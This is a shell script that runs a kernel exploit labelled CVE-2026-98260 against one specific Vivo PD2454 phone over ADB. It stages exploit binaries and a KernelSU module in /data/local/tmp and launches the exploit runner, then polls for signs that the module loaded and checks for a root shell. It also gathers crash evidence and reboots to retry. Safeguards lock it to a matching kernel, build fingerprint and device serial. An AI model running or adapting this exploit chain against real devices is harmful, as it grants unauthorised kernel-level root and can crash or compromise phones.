#!/bin/sh
# Vivo PD2454: check the target, stage verified KernelSU tools, run the
# CVE-2026-98260 bootstrap, collect logs, and optionally reboot/retry.
set -u

COUNT=10
if [ "$#" -gt 0 ]; then
    case "$1" in ''|*[!0-9]*) ;; *) COUNT=$1; shift ;; esac
fi
[ "$COUNT" -ge 1 ] 2>/dev/null && [ "$COUNT" -le 100 ] 2>/dev/null || {
    echo 'usage: ./run.sh [attempt-count 1..100] --device-id ro.serialno [--reboot-first]' >&2
    exit 2
}
DEVICE_ID=
REBOOT_FIRST=0
while [ "$#" -gt 0 ]; do
    case "$1" in
        --device-id) [ "$#" -ge 2 ] || exit 2; DEVICE_ID=$2; shift 2 ;;
        --reboot-first) REBOOT_FIRST=1; shift ;;
        -h|--help) echo 'Usage: ./run.sh [attempt-count 1..100] --device-id ro.serialno [--reboot-first]'; exit 0 ;;
        *) echo "Unknown option: $1" >&2; exit 2 ;;
    esac
done
case "$DEVICE_ID" in ''|*[!A-Za-z0-9_-]*) echo 'Supply the target ro.serialno with --device-id' >&2; exit 2;; esac

KERNEL=6.6.127-android15-8-g3b723d0e8507-abogki558056638-4k
FINGERPRINT=vivo/PD2454/PD2454:17/CP2A.260605.016_V000L1/261030013318:user/release-keys
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
LOG_ROOT="$ROOT/logs"
mkdir -p "$LOG_ROOT" || exit 2
JOURNAL="$LOG_ROOT/attempt-journal.log"
SERIAL=
KNOWN_ENDPOINTS=

record() { printf '%s %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$*" | tee -a "$JOURNAL"; }
adb_target() { adb -s "$SERIAL" "$@"; }
shell_target() { adb_target shell "$1" 2>/dev/null | tr -d '\r'; }

# Browse the already-paired wireless ADB advertisement for this device. No
# pairing or authorization is attempted. USB serials work without Bonjour.
discover_wireless() {
    command -v dns-sd >/dev/null 2>&1 || return 0
    browse=$(mktemp) || return 0
    dns-sd -B _adb-tls-connect._tcp local. >"$browse" 2>&1 &
    dns_pid=$!
    sleep 2
    kill "$dns_pid" 2>/dev/null || true
    wait "$dns_pid" 2>/dev/null || true
    services=$(sed -nE "s/.*(adb-${DEVICE_ID}-[A-Za-z0-9_-]+).*/\\1/p" "$browse" | sort -u)
    rm -f "$browse"
    for service in $services; do
        detail=$(mktemp) || continue
        dns-sd -L "$service" _adb-tls-connect._tcp local. >"$detail" 2>&1 &
        dns_pid=$!
        sleep 2
        kill "$dns_pid" 2>/dev/null || true
        wait "$dns_pid" 2>/dev/null || true
        if grep -q "serial=$DEVICE_ID" "$detail"; then
            endpoint=$(sed -nE 's/.*can be reached at ([A-Za-z0-9_.-]+\.local\.):([0-9]+).*/\1:\2/p' "$detail" | head -1)
            host=${endpoint%:*}
            port=${endpoint##*:}
            if [ -n "$host" ] && [ "$port" != "$endpoint" ]; then
                address=$(dscacheutil -q host -a name "$host" 2>/dev/null | awk '/ip_address:/{print $2;exit}')
                [ -n "$address" ] || address=$(getent ahostsv4 "$host" 2>/dev/null | awk 'NR==1{print $1}')
                case "$address" in
                    10.*|192.168.*|172.1[6-9].*|172.2?.*|172.3[01].*)
                        endpoint="$address:$port"
                        adb connect "$endpoint" >/dev/null 2>&1 || true
                        KNOWN_ENDPOINTS="$KNOWN_ENDPOINTS $endpoint"
                        ;;
                esac
            fi
        fi
        rm -f "$detail"
    done
}

candidates() {
    adb devices 2>/dev/null | awk 'NR>1 && $2=="device" {print $1}'
}
ready() {
    exclude_boot=${1:-}
    deadline=$(( $(date +%s) + 300 ))
    while [ "$(date +%s)" -lt "$deadline" ]; do
        for candidate in $(candidates); do
            case "$candidate" in
                "$DEVICE_ID"|"adb-$DEVICE_ID-"*) ;;
                *) case " $KNOWN_ENDPOINTS " in *" $candidate "*) ;; *) continue;; esac ;;
            esac
            [ "$(adb -s "$candidate" shell getprop ro.serialno 2>/dev/null | tr -d '\r')" = "$DEVICE_ID" ] || continue
            [ "$(adb -s "$candidate" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = 1 ] || continue
            boot=$(adb -s "$candidate" shell cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r')
            [ -n "$boot" ] && [ "$boot" != "$exclude_boot" ] || continue
            SERIAL=$candidate
            record "DEVICE_READY transport=$SERIAL boot=$boot"
            return 0
        done
        discover_wireless
        sleep 3
    done
    return 1
}

check_target() {
    [ "$(shell_target 'uname -r')" = "$KERNEL" ] &&
    [ "$(shell_target 'getprop ro.build.fingerprint')" = "$FINGERPRINT" ]
}

pull_evidence() {
    destination=$1
    mkdir -p "$destination"
    for name in iq.log ksu-trace.log ksu-init-trace.log kmsg-this-boot.txt ksu_slide; do
        adb_target pull "/data/local/tmp/$name" "$destination/$name" >/dev/null 2>&1 || true
    done
    adb_target shell 'getprop ro.boot.bootreason; getprop sys.boot.reason; getprop ro.boot.bootreasondetail' >"$destination/bootreason.txt" 2>/dev/null || true
    for remote in $(adb_target shell 'ls /data/local/tmp/pstore*.bin 2>/dev/null' 2>/dev/null | tr -d '\r'); do
        case "$remote" in /data/local/tmp/pstore*.bin) adb_target pull "$remote" "$destination/" >/dev/null 2>&1 || true;; esac
    done
}

stage_payloads() {
    for entry in bin/ic98260:ic98260 bin/ksupatch:ksupatch bin/insmodf:insmodf ksu/kernelsu.ko:kernelsu.ko; do
        local_file="$ROOT/${entry%:*}"
        remote_name=${entry#*:}
        [ -s "$local_file" ] || { record "REFUSED missing_payload=$local_file"; return 1; }
        expected=$(shasum -a 256 "$local_file" | awk '{print $1}')
        adb_target push "$local_file" "/data/local/tmp/$remote_name" >/dev/null || return 1
        adb_target shell "chmod 755 /data/local/tmp/$remote_name" >/dev/null || return 1
        actual=$(shell_target "sha256sum /data/local/tmp/$remote_name" | awk '{print $1}')
        [ "$actual" = "$expected" ] || { record "REFUSED hash_mismatch=$remote_name"; return 1; }
    done
    adb_target shell 'rm -f /data/local/tmp/ksupatch_neuter /data/local/tmp/ksupatch_skip' >/dev/null || return 1
}

run_attempt() {
    attempt=$1
    stamp=$(date +%Y%m%d-%H%M%S)
    campaign="$LOG_ROOT/camp-$stamp"
    output="$campaign/attempt-$attempt"
    mkdir -p "$output" "$campaign/inherited"
    pull_evidence "$campaign/inherited"
    if ! check_target; then record 'REFUSED target_mismatch'; return 2; fi
    if [ -n "$(shell_target "grep '^kernelsu ' /proc/modules")" ] || [ -n "$(shell_target 'pidof ic98260')" ]; then
        record 'REFUSED module_or_runner_already_present'; return 2
    fi
    stage_payloads || { record 'REFUSED payload_staging_failed'; return 2; }
    record "ATTEMPT_LAUNCH number=$attempt"
    adb_target shell "cd /data/local/tmp; rm -f iq.log hkd_base hkd_go hkd_open kmsg-this-boot.txt pstore*.bin; setsid sh -c './ic98260 fake >iq.log 2>&1 </dev/null &'" >/dev/null 2>&1 || {
        record 'REFUSED launch_command_failed'; return 2;
    }
    elapsed=0
    outcome=RUNNING
    while [ "$elapsed" -lt "${RUN_WAIT:-300}" ]; do
        sleep 10
        elapsed=$((elapsed+10))
        [ "$(adb_target get-state 2>/dev/null)" = device ] || { outcome=CRASH-INCOMPLETE; break; }
        [ -n "$(shell_target "grep '^kernelsu ' /proc/modules")" ] && { outcome=MODULE-LISTED; break; }
        text=$(shell_target 'cat /data/local/tmp/iq.log')
        case "$text" in
            *KSU_LOADED*|*"KernelSU Live"*|*"EARLY MODULE LOAD SUCCEEDED"*) outcome=DONE; break;;
            *"ksu stage (finalize) worker"*) outcome=COMPLETE-NO-KSU; break;;
            *"burst miss -- parking"*|*"[-] plant1 burst missed"*) outcome=PARK-BURST; break;;
            *"parking without reap"*|*"-- parking"*|*"[-] child euid is not 0"*) outcome=PARK-OTHER; break;;
            "") ;;
            *) [ -n "$(shell_target 'pidof ic98260')" ] || { outcome=PARK-OTHER; break; };;
        esac
    done
    [ "$outcome" != RUNNING ] || outcome=WINDOW-ELAPSED
    pull_evidence "$output"
    adb_target shell 'getenforce; cat /proc/sys/kernel/random/boot_id; grep kernelsu /proc/modules' >"$output/state.txt" 2>&1 || true
    printf 'outcome=%s\n' "$outcome" >"$output/outcome.txt"
    record "ATTEMPT_RESULT number=$attempt outcome=$outcome evidence=$output"
    case "$outcome" in
        DONE|MODULE-LISTED)
            adb_target shell 'timeout 5 /data/local/tmp/ksud debug info' >"$output/driver-info.txt" 2>&1 || true
            adb_target shell "timeout 5 sh -c 'printf \"id\\nexit\\n\" | /data/local/tmp/ksud debug su'" >"$output/root-check.txt" 2>&1 || true
            return 0;;
    esac
    text=$(cat "$output/iq.log" 2>/dev/null || true)
    case "$text" in *"[ksu] direct insmodf"*) return 3;; esac
    return 1
}

if ! ready; then record 'NEEDS_DEVICE no_authenticated_boot_ready_target'; exit 2; fi
if ! check_target; then record 'REFUSED_TARGET_MISMATCH no reboot or exploit attempted'; exit 2; fi
if [ "$REBOOT_FIRST" -eq 1 ]; then
    old=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
    record "AUTHORIZED_INITIAL_REBOOT boot=$old"
    adb_target reboot >/dev/null 2>&1 || true
    ready "$old" || { record 'NEEDS_DEVICE reboot_did_not_return_as_fresh_boot'; exit 2; }
fi
attempt=0
while [ "$attempt" -lt "$COUNT" ]; do
    ready || { record 'NEEDS_DEVICE target_not_ready'; exit 2; }
    if ! check_target; then record 'REFUSED_TARGET_MISMATCH'; exit 2; fi
    if [ -n "$(shell_target "grep '^kernelsu ' /proc/modules")" ]; then record 'MODULE_LISTED preserving_loaded_module'; exit 0; fi
    old=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
    if [ -n "$(shell_target 'pidof ic98260')" ]; then
        if [ "$attempt" -ge "$COUNT" ]; then record 'ATTEMPT_LIMIT parked_process_needs_manual_reboot'; exit 1; fi
        recovery="$LOG_ROOT/recovery-$(date +%Y%m%d-%H%M%S)"
        pull_evidence "$recovery"
        record 'RECOVER_PARKED rebooting_to_clear_holders'
        adb_target reboot >/dev/null 2>&1 || true
        ready "$old" || { record 'NEEDS_DEVICE after_recovery_reboot'; exit 2; }
        continue
    fi
    attempt=$((attempt+1))
    run_attempt "$attempt"; result=$?
    [ "$result" -eq 0 ] && exit 0
    [ "$result" -eq 2 ] && exit 2
    [ "$result" -eq 3 ] && { record 'CANDIDATE_EXECUTED_NEEDS_ANALYSIS stopping_without_retry'; exit 1; }
    [ "$attempt" -lt "$COUNT" ] || { record "ATTEMPT_LIMIT attempts=$attempt"; exit 1; }
    new=$(shell_target 'cat /proc/sys/kernel/random/boot_id')
    if [ "$new" = "$old" ]; then
        record "RECOVERY_REBOOT attempt=$attempt"
        adb_target reboot >/dev/null 2>&1 || true
        ready "$old" || { record 'NEEDS_DEVICE after_reboot'; exit 2; }
    fi
done
